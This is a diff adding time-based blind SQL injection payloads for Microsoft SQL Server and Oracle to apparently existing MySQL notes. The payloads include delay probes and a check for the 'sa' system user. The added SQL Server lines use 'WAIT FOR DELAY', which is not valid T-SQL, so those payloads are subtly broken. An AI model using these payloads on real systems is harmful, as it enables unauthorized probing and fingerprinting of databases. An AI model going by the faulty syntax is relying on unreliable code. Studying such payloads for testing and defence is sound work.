@@ -38,3 +38,14 @@ select * from students where Student_ID = 1 and SLEEP(50); --> This query will r
 select * from students where Student_ID = 1-BENCHMARK(100, rand());  --> Will run the specified function 100 times and then give out the result
 
 SELECT * FROM products WHERE id=1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0);  --> Will observe delay in response if the Mysql version is 5.x.x
+
+For Microsoft SQL Server,
+
+SELECT * FROM products WHERE id=1; WAIT FOR DELAY '00:00:15'
+
+SELECT * FROM products WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'
+
+For Oracle server,
+
+SELECT * FROM products WHERE id=1; BEGIN DBMS_LOCK.SLEEP(15); END;
+
